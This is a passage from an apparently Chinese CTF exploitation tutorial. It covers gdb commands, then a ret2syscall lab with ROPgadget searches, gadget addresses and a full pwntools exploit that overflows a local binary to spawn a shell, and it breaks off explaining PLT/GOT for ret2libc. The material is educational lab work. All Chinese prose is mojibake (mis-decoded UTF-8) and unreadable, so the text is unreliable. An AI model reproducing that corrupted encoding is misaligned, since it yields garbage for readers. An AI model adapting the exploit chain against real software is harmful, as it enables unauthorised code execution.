æ‰“æ–­ç‚¹</h2><p>æ–­ç‚¹æ˜¯<code>break</code> å‘½ä»¤ï¼ˆå¯ä»¥ç”¨ <code>b</code> ä»£æ›¿ï¼‰å¸¸ç”¨çš„è¯­æ³•æ ¼å¼æœ‰ä»¥ä¸‹ 2 ç§ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) break location             # æ ¼å¼1ï¼š b location<br>(gdb) break ... if cond         # æ ¼å¼2ï¼š b .. if cond<br></code></pre></td></tr></table></figure><h2 id="3-2-å¸¸è§å‘½ä»¤">3.2 å¸¸è§å‘½ä»¤</h2><p>æ–­ç‚¹è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œå¸¸è§çš„å‘½ä»¤</p><table><thead><tr><th>å‘½ä»¤ï¼ˆç¼©å†™ï¼‰</th><th>åŠŸ èƒ½</th></tr></thead><tbody><tr><td>runï¼ˆrï¼‰</td><td>å¯åŠ¨æˆ–è€…é‡å¯ä¸€ä¸ªç¨‹åºã€‚</td></tr><tr><td>listï¼ˆlï¼‰</td><td>æ˜¾ç¤ºå¸¦æœ‰è¡Œå·çš„æºç ã€‚</td></tr><tr><td>continueï¼ˆcï¼‰</td><td>è®©æš‚åœçš„ç¨‹åºç»§ç»­è¿è¡Œã€‚</td></tr><tr><td>nextï¼ˆnï¼‰</td><td>å•æ­¥è°ƒè¯•ç¨‹åºï¼Œå³æ‰‹åŠ¨æ§åˆ¶ä»£ç ä¸€è¡Œä¸€è¡Œåœ°æ‰§è¡Œã€‚</td></tr><tr><td>stepï¼ˆsï¼‰</td><td>å¦‚æœæœ‰è°ƒç”¨å‡½æ•°ï¼Œè¿›å…¥è°ƒç”¨çš„å‡½æ•°å†…éƒ¨ï¼›å¦åˆ™ï¼Œå’Œ next å‘½ä»¤çš„åŠŸèƒ½ä¸€æ ·ã€‚</td></tr><tr><td>untilï¼ˆuï¼‰ until locationï¼ˆu locationï¼‰</td><td>å½“ä½ åŒå€¦äº†åœ¨ä¸€ä¸ªå¾ªç¯ä½“å†…å•æ­¥è·Ÿè¸ªæ—¶ï¼Œå•çº¯ä½¿ç”¨ until å‘½ä»¤ï¼Œå¯ä»¥è¿è¡Œç¨‹åºç›´åˆ°é€€å‡ºå¾ªç¯ä½“ã€‚ until n å‘½ä»¤ä¸­ï¼Œn ä¸ºæŸä¸€è¡Œä»£ç çš„è¡Œå·ï¼Œè¯¥å‘½ä»¤ä¼šä½¿ç¨‹åºè¿è¡Œè‡³ç¬¬ n è¡Œä»£ç å¤„åœæ­¢ã€‚</td></tr><tr><td>finishï¼ˆfiï¼‰</td><td>ç»“æŸå½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°ï¼Œå¹¶åœ¨è·³å‡ºå‡½æ•°åæš‚åœç¨‹åºçš„æ‰§è¡Œã€‚</td></tr><tr><td>returnï¼ˆreturnï¼‰</td><td>ç»“æŸå½“å‰è°ƒç”¨å‡½æ•°å¹¶è¿”å›æŒ‡å®šå€¼ï¼Œåˆ°ä¸Šä¸€å±‚å‡½æ•°è°ƒç”¨å¤„åœæ­¢ç¨‹åºæ‰§è¡Œã€‚</td></tr><tr><td>jumpï¼ˆjï¼‰</td><td>ä½¿ç¨‹åºä»å½“å‰è¦æ‰§è¡Œçš„ä»£ç å¤„ï¼Œç›´æ¥è·³è½¬åˆ°æŒ‡å®šä½ç½®å¤„ç»§ç»­æ‰§è¡Œåç»­çš„ä»£ç ã€‚</td></tr><tr><td>printï¼ˆpï¼‰</td><td>æ‰“å°æŒ‡å®šå˜é‡çš„å€¼ã€‚</td></tr><tr><td>quitï¼ˆqï¼‰</td><td>é€€å‡º GDB è°ƒè¯•å™¨ã€‚</td></tr></tbody></table><p>è¿è¡Œå¸¦libcåº“çš„ç¨‹åºï¼š<code>gdb -q --args ./ld-linux-x86-64.so.2 --library-path . ./pwn</code></p><p>è¿›å…¥gdbåæ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">å…è®¸æ–­ç‚¹åœ¨ç¬¦å·å°šæœªåŠ è½½æ—¶æš‚å­˜</span><br>(gdb) set breakpoint pending on<br><span class="hljs-meta prompt_"># </span><span class="language-bash">è®© gdb è‡ªåŠ¨åŠ è½½å…±äº«åº“çš„ç¬¦å·</span><br>(gdb) set auto-solib-add on<br></code></pre></td></tr></table></figure><p>ä¹‹åå°±å¯ä»¥æ­£å¸¸è¿è¡Œäº†ã€‚</p><h1 id="04-ret2syscall">04 ret2syscall</h1><h2 id="4-1-è¡¥å……ç³»ç»Ÿè°ƒç”¨çŸ¥è¯†">4.1 è¡¥å……ç³»ç»Ÿè°ƒç”¨çŸ¥è¯†</h2><p>é¦–å…ˆè¦çŸ¥é“ä¸€äº›ç³»ç»Ÿè°ƒç”¨çš„åŸºç¡€çŸ¥è¯†ï¼Œä¸çŸ¥é“çš„å»ºè®®å…ˆå­¦å­¦å†…æ ¸æ‰©å……ä¸€ä¸‹çŸ¥è¯†åº“ã€‚éšåéœ€è¦çŸ¥é“æ‰§è¡Œå‘½ä»¤çš„ç³»ç»Ÿè°ƒç”¨ä¸º<code>execve()</code>ã€‚32ä½ç³»ç»Ÿä¸­è¯¥ç³»ç»Ÿè°ƒç”¨çš„ç¼–å·ä¸º0xbï¼Œè°ƒç”¨å·é€šè¿‡<strong>eax</strong>ä¼ é€’ï¼Œå…¶ä½™å‚æ•°ä¼ é€’ä¸º<strong>ebx</strong>ï¼Œ<strong>ecx</strong>ï¼Œ<strong>edx</strong>ï¼Œ<strong>esi</strong>ï¼Œ<strong>edi</strong>ã€‚</p><p>64ä½ç³»ç»Ÿçš„ç³»ç»Ÿè°ƒç”¨å·ä¸º0x3bï¼Œ<strong>rax</strong>ä¼ é€’ï¼Œå…¶ä½™å‚æ•°ä¼ é€’ä¸º<strong>rdi</strong>ï¼Œ<strong>rsi</strong>ï¼Œ<strong>rdx</strong>ï¼Œ<strong>r10</strong>ï¼Œ<strong>r8</strong>ï¼Œ<strong>r9</strong>ã€‚</p><p>ä¸”retè¿”å›çš„å‡½æ•°åä¸åŒ</p><ul><li>32ä½ä¸ºint 0x80ï¼Œ64ä½ä¸ºsyscall ret</li></ul><h2 id="4-2-é¢˜ç›®åˆ†æ">4.2 é¢˜ç›®åˆ†æ</h2><p>æ¥ä¸‹æ¥çœ‹çœ‹è¿™é“é¢˜ç›®ï¼Œå‘ç°è¯¥ç¨‹åºå¼€å¯æ ˆä¸å¯æ‰§è¡Œã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514152820279.png" alt="image-20250514152820279"></p><p>è¿›idaçš„ç¨‹åºä¸»ä½“çœ‹ä¸€ä¸‹ï¼Œå‘ç°æ²¡æœ‰ç°æˆçš„systemå‡½æ•°ï¼Œä½†æ˜¯è¿˜æ˜¯å­˜åœ¨getså‡½æ•°ï¼Œè¯´æ˜å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514153052485.png" alt="image-20250514153052485"></p><p>éšåèƒ½æ³¨æ„åˆ°å·¦ä¾§ä¸€å †å‡½æ•°ï¼Œæ„Ÿè§‰æ˜¯ç”¨äº†é™æ€é“¾æ¥åº“</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514153240100.png" alt="image-20250514153240100"></p><p>ç”¨fileå‘½ä»¤æŸ¥ä¸€ä¸‹ï¼Œæœç„¶æ˜¯é™æ€é“¾æ¥çš„ç¨‹åºï¼Œè¿™ä¹Ÿå°±æ»¡è¶³äº†ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨çš„æ¡ä»¶ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514153348275.png" alt="image-20250514153348275"></p><p>é‚£è¿™é“é¢˜ç›®å°±å¾ˆæ˜æ˜¾äº†ã€‚éšåè¡¥å……ä¸€ä¸‹çŸ¥è¯†ç‚¹</p><h2 id="4-3-ROPæ˜¯ä»€ä¹ˆï¼ŒROPgadgetä½¿ç”¨">4.3 ROPæ˜¯ä»€ä¹ˆï¼ŒROPgadgetä½¿ç”¨</h2><blockquote><p>éšç€ NX ä¿æŠ¤çš„å¼€å¯ï¼Œä»¥å¾€ç›´æ¥å‘æ ˆæˆ–è€…å †ä¸Šç›´æ¥æ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæœã€‚æ”»å‡»è€…ä»¬ä¹Ÿæå‡ºæ¥ç›¸åº”çš„æ–¹æ³•æ¥ç»•è¿‡ä¿æŠ¤ï¼Œç›®å‰ä¸»è¦çš„æ˜¯ ROP(Return Oriented Programming)ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ (gadgets) æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p></blockquote><p>ret2syscallï¼Œå³é€šè¿‡ROPæ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shellã€‚ä¹Ÿå°±æ˜¯é€šè¿‡ä¸€ç‚¹ä¸€ç‚¹çš„æ‰§è¡Œæ±‡ç¼–ä»£ç æ‹¼æ¥æˆæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ç¨‹åºã€‚æ‰€è°“ gadgets å°±æ˜¯ä»¥ ret ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ã€‚</p><ul><li>ä¾‹å¦‚ï¼špop eax ; ret</li></ul><p>è¿™æ®µä»£ç çš„ä½œç”¨å°±æ˜¯å°†æ ˆé¡¶çš„æ•°æ®å¼¹å‡ºç»™eaxï¼Œç„¶åå†å°†æ ˆé¡¶çš„æ•°æ®ä½œä¸ºè¿”å›åœ°å€è¿”å›ã€‚</p><p>è·å–gadgetsçš„æ–¹å¼ï¼š</p><ul><li><code>ROPgadget --binary æ–‡ä»¶å --only 'pop|ret' |grep 'å¯„å­˜å™¨å'</code></li><li><code>ROPgadget --binary æ–‡ä»¶å --only 'int'</code></li><li><code>ROPgadget --binary æ–‡ä»¶å --string '/bin/sh'</code></li></ul><p>è¦ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œé‚£å°±éœ€è¦æŠŠç³»ç»Ÿè°ƒç”¨å·ä¼ å…¥eaxå¯„å­˜å™¨ï¼Œç„¶åéœ€è¦æŠŠecxå’Œedxçš„å¯„å­˜å™¨ç»™æ¸…ç©ºã€‚æœ€åå°±æ˜¯éœ€è¦å»æŠŠå‚æ•°/bin/shçš„åœ°å€å­˜å…¥ebxå¯„å­˜å™¨ã€‚</p><h2 id="4-4-æ€ä¹ˆæŠŠå‚æ•°-bin-shå†™å…¥ç¨‹åºä¸­ï¼Ÿå†™åˆ°å“ªï¼Ÿ">4.4 æ€ä¹ˆæŠŠå‚æ•°/bin/shå†™å…¥ç¨‹åºä¸­ï¼Ÿå†™åˆ°å“ªï¼Ÿ</h2><h3 id="4-4-1-å†™åˆ°å“ª">4.4.1 å†™åˆ°å“ª</h3><p><strong>æˆ‘ä»¬è¦å°½å¯èƒ½å†™åˆ°bssæ®µ</strong>ï¼Œå› ä¸ºåœ¨ä¸å¼€pieçš„æƒ…å†µä¸‹ï¼Œ<strong>bssæ®µçš„åœ°å€æ˜¯ä¸ä¼šå˜çš„</strong>ï¼Œè¿™æ„å‘³ç€ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨IDAçœ‹ä¸€ä¸‹bssæ®µçš„åœ°å€ç„¶åé€‰å®šä¸€ä¸ªæˆ‘ä»¬å†™å…¥å‚æ•°çš„åœ°å€ï¼Œç„¶åæˆ‘ä»¬expå°±å¯ä»¥ç›´æ¥å†™ä¸Šè¿™ä¸ªåœ°å€äº†ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³å†™åˆ°æ ˆé‡Œé¢ï¼Œç¡®å®ç”¨gdbä¹Ÿå¯ä»¥çœ‹åˆ°å†™åœ¨äº†å“ªä¸ªå†…å­˜å•å…ƒé‡Œé¢ï¼Œä½†æ˜¯è¿™ä¸ªåœ°å€æ˜¯ä¼šå˜çš„ï¼ŒæŠŠexpä¸Šå†™å…¥æˆ‘ä»¬åˆšæ‰ç”¨gdbçœ‹åˆ°çš„åœ°å€ã€‚è§£å†³åŠæ³•ä¹Ÿæœ‰ï¼Œé‚£å°±æ˜¯éœ€è¦æ³„éœ²ç¨‹åºçš„ä¸€ä¸ªå†…å­˜å•å…ƒåœ°å€ï¼Œç„¶ååˆ©ç”¨åç§»ï¼Œæ¥è®¡ç®—å‡ºæˆ‘ä»¬å­˜æ”¾/bin/shå‚æ•°çš„åœ°å€ã€‚ä½†æ˜¯è¿™æ ·å¤šå°‘æœ‰ç‚¹éº»çƒ¦ï¼Œå¹¶ä¸”å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•æ³„éœ²ç¨‹åºä¸­çš„åœ°å€çš„ï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©å†™åˆ°bssæ®µã€‚</p><h3 id="4-4-2-æ€ä¹ˆå†™ï¼Ÿ">4.4.2 æ€ä¹ˆå†™ï¼Ÿ</h3><h4 id="ç¬¬ä¸€ç§æ–¹æ³•">ç¬¬ä¸€ç§æ–¹æ³•</h4><p><strong>ç¬¬ä¸€ç§æ–¹æ³•æ˜¯å»æœç´¢gadgetï¼Œå¯»æ‰¾pop [ecx]è¿™ç±»å¯¹åœ°å€å†…å®¹æ“ä½œçš„æŒ‡ä»¤</strong>ã€‚ç„¶åæˆ‘ä»¬åˆ©ç”¨å¦‚ä¸‹payloadå¯ä»¥è¾¾åˆ°å°†å‚æ•°/bin/shå†™å…¥bssæ®µã€‚ï¼ˆ<em>å¹¶ä¸”è¿™éƒ¨åˆ†çš„payloadéœ€è¦æ”¾åˆ°è¿”å›åœ°å€å¤„ä½¿ç”¨</em>ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=p32(pop_ecx_addr)+p32(bss_addr)+p32(pop_[ecx]_addr)+<span class="hljs-string">&#x27;/bin&#x27;</span><br>payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="hljs-number">4</span>)+p32(pop_[ecx]_addr)+<span class="hljs-string">&#x27;/sh\x00&#x27;</span><br></code></pre></td></tr></table></figure><p>é¦–å…ˆpop_ecx_addræŒ‡çš„æ˜¯pop ecx;retè¿™ä¸ªæŒ‡ä»¤çš„åœ°å€ bss_addræŒ‡çš„å°†å‚æ•°å†™å…¥bssæ®µçš„å…·ä½“åœ°å€</p><p>pop_[ecx]_addræŒ‡çš„æ˜¯pop dword ptr [ecx];retè¿™ä¸ªæŒ‡ä»¤çš„åœ°å€ (è¿™é‡Œæˆ‘å†™[ecx]æ˜¯ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œæˆ‘è®°å¾—å®é™…çš„expé‡Œé¢ï¼Œä¸èƒ½ä½¿ç”¨æ–¹æ‹¬å·ï¼‰ï¼ˆå¦å¤–è¿™é‡Œä¸ä¸€å®šè¦æ˜¯ecxï¼Œåˆ«çš„å¯„å­˜å™¨ä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œåªæ˜¯ä¸¾ä¸ªä¾‹å­ï¼‰ç„¶åå‚æ•°/binå°±æ˜¯æˆ‘ä»¬çš„å‚æ•°</p><p><strong>è‡³äºè¿™ä¸ªbss_addr+4æ˜¯ä¸Šé¢bss_addrçš„åœ°å€çš„è¡”æ¥ï¼Œå› ä¸ºå‚æ•°/bin/shéœ€è¦ä¸¤ä¸ªå†…å­˜å•å…ƒå­˜æ”¾ï¼Œå› æ­¤åœ¨è¿™é‡Œå°†ä¸Šé¢çš„åœ°å€åŠ 4ï¼Œå°±å­˜åˆ°äº†ä¸‹é¢çš„å†…å­˜å•å…ƒ</strong>ã€‚æœ€åçš„\x00æ˜¯ç”¨æ¥å£°æ˜å­—ç¬¦ä¸²çš„ç»“æŸã€‚</p><p><strong>ä½†æ˜¯è¿™æ ·æœå¯»gadgetçš„æ‰‹æ®µï¼Œæ˜¯æœ‰å¼Šç«¯çš„ï¼Œå› ä¸ºæœ‰æ—¶å€™ç¨‹åºå¯èƒ½æ°å¥½å°±æ²¡æœ‰ç±»ä¼¼äºpop [ecx]è¿™æ ·çš„æŒ‡ä»¤ã€‚</strong></p><h4 id="ç¬¬äºŒç§æ–¹æ³•">ç¬¬äºŒç§æ–¹æ³•</h4><p>å› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼Œç­‰åˆ°å¯ä»¥æº¢å‡ºçš„æ—¶å€™ï¼Œç”¨ropï¼Œ<strong>å…ˆå»æŠŠè¿”å›åœ°å€å¤„æ”¾ç½®ä¸€ä¸ªreadå‡½æ•°ï¼Œç„¶åå†æŠŠ/bin/shå†™å…¥æŒ‡å®šçš„åœ°å€ï¼ˆæŠŠè¯¥åœ°å€æ”¾åœ¨readå‡½æ•°ç¬¬äºŒä¸ªå‚æ•°å³å¯ï¼‰ç„¶åå†éšä¾¿æ‰¾ä¸€ä¸ªè¿ç»­ä¸‰æ¬¡popçš„æŒ‡ä»¤ï¼ˆä¸è¿ç»­åº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œåæ­£å°±è¦è¿›è¡Œä¸‰æ¬¡popï¼Œå°†readå‡½æ•°çš„ä¸‰ä¸ªå‚æ•°å…ˆä»æ ˆé¡¶ç»™å¼¹å‡ºæ¥ï¼‰</strong><br>æ¥ç€å†è¿›è¡Œret2syscallï¼Œå‚æ•°ä¼ å®Œäº†ï¼Œå‰©ä¸‹çš„åªè¦æ‰¾äº›gadgetç‰‡æ®µè¿›è¡Œret2syscallå³å¯ã€‚å¦‚æœæ²¡æœ‰readå‡½æ•°çš„è¯ï¼Œç†è®ºæ¥è¯´æˆ‘ä»¬æ˜¯å¯ä»¥ç³»ç»Ÿè°ƒç”¨readå‡½æ•°çš„ï¼Œä½†æ˜¯æˆ‘è¯•äº†ä¸€ä¸‹ï¼Œå½“ç”¨int 0x80æ¥ç³»ç»Ÿè°ƒç”¨readå‡½æ•°ä¹‹åï¼Œint 0x80æŒ‡ä»¤çš„åé¢ä¸æ˜¯retæŒ‡ä»¤ï¼Œæ²¡æœ‰åŠæ³•å†å»è¡”æ¥åé¢çš„gadgetäº†ã€‚ä¸è¿‡ç›®å‰è¿˜æ²¡æœ‰é‡è§è¿‡ç³»ç»Ÿè°ƒç”¨readå‡½æ•°å†ret2syscallçš„é¢˜ç›®ã€‚</p><p>å½“ä½¿ç”¨è¿™ä¸¤ç§æ–¹æ³•å…¶ä¸­çš„ä¸€ç§ä¹‹åï¼Œä¼ å‚å®Œæ¯•ï¼Œå¦‚æ­¤å‰©ä¸‹çš„å°±æ˜¯å»æœå¯»æˆ‘ä»¬éœ€è¦çš„gadgetç‰‡æ®µï¼Œæœ€åç³»ç»Ÿè°ƒç”¨å³å¯ã€‚</p><h2 id="4-5-æ€è·¯">4.5 æ€è·¯</h2><blockquote><p>å› æ­¤è¿™é“é¢˜çš„æ€è·¯å¾ˆæ˜ç¡®äº†ï¼Œæº¢å‡ºä¹‹åå¡«å……pop eaxæ‰€åœ¨åœ°å€ï¼Œä¹‹åå¼¹å‡º<code>int 0x80</code>åˆ°eaxä¸­ï¼Œåœ¨è¿™ä¹‹åå¼¹å‡ºpop ebxæ‰€åœ¨åœ°å€ï¼Œå°†<code>'/bin/sh'</code>å¼¹å‡ºåˆ°ebxä¸­ã€‚æŒ‰ç…§è¿™ä¸ªé€»è¾‘å°†ecxå’Œedxéƒ½èµ‹å€¼ä¸º0</p></blockquote><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥æ‰¾ä¸€ä¸‹è¿™äº›ç»“æ„çš„åœ°å€ï¼Œé¦–å…ˆæ˜¯pop eax;retï¼Œè¿™é‡Œç¬¬ä¸€ä¸ªåŒ…å«pop ebxï¼Œä¼šæ‰“ä¹±æ ˆï¼Œé€‰æ‹©ç¬¬äºŒä¸ª<code>0x080bb196</code>ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514212217965.png" alt="image-20250514212217965"></p><p>æ¥ä¸‹æ¥æ‰¾ä¸€ä¸‹<code>/bin/sh</code>çš„åœ°å€ï¼Œæ²¡æœ‰çš„è¯å°±åªèƒ½è‡ªå·±æ„é€ ä¸€ä¸‹ã€‚æ‰¾åˆ°<code>'/bin/sh'</code>çš„åœ°å€ä¸º<code>0x080be408</code>ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514215139448.png" alt="image-20250514215139448"></p><p>æ¥ä¸‹æ¥æ‰¾ä¸€ä¸‹pop ebx;retï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œæ„å¤–å‘ç°ç®­å¤´æ‰€æŒ‡çš„åœ°æ–¹æ­£æ˜¯æˆ‘ä»¬æƒ³è¦èµ‹å€¼çš„æ‰€æœ‰å‰©ä½™å¯„å­˜å™¨ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä½¿ç”¨è¯¥åœ°å€<code>0x0806eb90</code>ï¼Œå°†æ ˆç»“æ„ç¨å¾®ä¿®æ”¹ä¸€ä¸‹å³å¯ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514215438603.png" alt="image-20250514215438603"></p><p>æ¥ä¸‹æ¥çœ‹çœ‹int 0x80æ‰€åœ¨åœ°å€ï¼Œæ‰¾åˆ°ä¸º<code>0x08049421</code>ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514215607789.png" alt="image-20250514215607789"></p><p>æœ€åæˆ‘ä»¬æ¥çœ‹çœ‹éœ€è¦å¡«å……å¤šå°‘æ‰èƒ½æº¢å‡ºï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514215830198.png" alt="image-20250514215830198"></p><p>å¡«å……64h+4ä¸ªå­—ç¬¦å¯ä»¥è¦†ç›–è¿”å›åœ°å€ã€‚ä½†æ˜¯è¿™é‡Œæœ‰å‘ï¼Œæ³¨æ„åˆ°æ ˆä¸­æ²¡æœ‰å®šä¹‰v4çš„èµ·å§‹ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´v4å‰é¢æœ‰å¤šå°‘æ•°æ®å…¥æ ˆæ˜¯éœ€è¦è°ƒè¯•çš„ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºæ¥ã€‚</p><p>ä½¿ç”¨pwngdbè°ƒè¯•ä¸€ä¸‹ï¼Œgdb ret2syscall b mainï¼ˆåœ¨mainå‡½æ•°ä¸‹æ–­ç‚¹ï¼‰ rï¼ˆè®©ç¨‹åºè·‘èµ·æ¥ï¼‰ nï¼ˆå•æ­¥æ‰§è¡Œï¼‰ ä¸€ç›´èµ°åˆ°getså‡½æ•°è¾“å…¥å­—ç¬¦ä¸²AAAAAAAAï¼Œçœ‹åˆ°æ ˆç»“æ„ï¼Œæ­¤æ—¶ebpä¸º0xffffd5b8ï¼Œè¾“å…¥çš„v4çš„åœ°å€ä¸º0xffffd54cï¼Œb8-4c=6cã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250515110010964.png" alt="image-20250515110010964"></p><p>æ€è·¯ç†æ¸…æ¥šä¹‹åæˆ‘ä»¬æ¥æƒ³ä¸€ä¸‹æˆåŠŸåˆ©ç”¨çš„æ ˆé•¿ä»€ä¹ˆæ ·ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+---------------------+</span><br><span class="hljs-section">| &#x27;A&#x27; * 0x70          | â† å¡«å……</span><br><span class="hljs-section">+---------------------+</span><br><span class="hljs-section">| 0xdeadbeef          | â† è¦†ç›– EBP</span><br><span class="hljs-section">+---------------------+</span><br><span class="hljs-section">| pop_eax_ret         | â† è¦†ç›–è¿”å›åœ°å€</span><br><span class="hljs-section">+---------------------+</span><br>| 0xb                 | â† ROP å‚æ•°<br></code></pre></td></tr></table></figure><p>è¯¥æœ‰çš„éƒ½æœ‰äº†æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ¥å†™POCäº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r=process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>pop_eax=<span class="hljs-number">0x080bb196</span><br>execve=<span class="hljs-number">0xb</span><br>int_80=<span class="hljs-number">0x08049421</span><br>pop_edx_ecx_ebx=<span class="hljs-number">0x0806eb90</span><br>bin_sh=<span class="hljs-number">0x080be408</span><br><br><br>p1=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>)+p32(pop_eax)+p32(execve)+p32(pop_edx_ecx_ebx)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bin_sh)+p32(int_80)<br><br>r.sendline(p1)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>ä¹‹åæ¥è¯•éªŒä¸€ä¸‹ï¼Œå‘ç°èƒ½æˆåŠŸåˆ©ç”¨æ¼æ´ï¼Œè¿™ä¸ªé¢˜ç›®å°±ç»“æŸå•¦ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250515112820755.png" alt="image-20250515112820755"></p><h1 id="05-ret2libc">05 ret2libc</h1><h2 id="5-1-PLTè¡¨å’ŒGOTè¡¨">5.1 PLTè¡¨å’ŒGOTè¡¨</h2><p>åœ¨è¿›è¡Œret2libcå­¦ä¹ ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆäº†è§£ä¸€ä¸‹PLTè¡¨ä¸GOTè¡¨çš„å†…å®¹ã€‚</p><p>Procedure linkage tableï¼ˆPLT)è¿‡ç¨‹è¿æ¥è¡¨ï¼Œä½äºä»£ç æ®µï¼Œæ˜¯ä¸€ä¸ªæ¯ä¸ªæ¡ç›®æ˜¯16å­—èŠ‚å†…å®¹çš„æ•°ç»„ï¼Œä½¿å¾—ä»£ç èƒ½å¤Ÿæ–¹ä¾¿çš„è®¿é—®å…±äº«çš„å‡½æ•°æˆ–è€…å˜é‡</p><p>Globle offset tableï¼ˆGOT)å…¨å±€åç§»é‡è¡¨ï¼Œä½äºæ•°æ®æ®µï¼Œæ˜¯ä¸€ä¸ªæ¯ä¸ªæ¡ç›®æ˜¯8å­—èŠ‚åœ°å€çš„æ•°ç»„ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°åœ¨å†…å­˜çš„ç¡®åˆ‡åœ°å€ã€‚å½“ç¨‹åºé¦–æ¬¡è°ƒç”¨æŸä¸ªå¤–éƒ¨å‡½æ•°æ—¶ï¼Œå®é™…ä¸Šä¼šè·³è½¬åˆ°PLTä¸­çš„å¯¹åº”æ¡ç›®ï¼Œè€Œä¸æ˜¯ç›´æ¥è°ƒç”¨ç›®æ ‡å‡½æ•°ã€‚</p><p>å¤–éƒ¨å‡½æ•°é¦–æ¬¡è°ƒç”¨æ—¶ï¼Œæ§åˆ¶æµä¼šç»è¿‡ PLT è¡¨ï¼ŒPLT ä¸­çš„ä»£ç ç‰‡æ®µé¦–å…ˆå°è¯•é€šè¿‡ GOT è·³è½¬ï¼Œä½†æ­¤æ—¶ GOT ä¸­å°šæœªå­˜å‚¨çœŸå®å‡½æ•°åœ°å€ï¼Œå› æ­¤ä¼šå›é€€åˆ° PLT ä¸­çš„è§£æé€»è¾‘ã€‚PLT ä¼šå‹å…¥å‡½æ•°åœ¨é‡å®šä½è¡¨ä¸­çš„ç´¢å¼•ï¼Œå¹¶è·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨ï¼Œç”±åŠ¨æ€é“¾æ¥å™¨è´Ÿè´£è§£æè¯¥å‡½æ•°çš„çœŸå®åœ°å€ï¼Œå°†å…¶å›å¡«åˆ° GOT ä¸­ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/msedge_JYwSoYktqg.png" 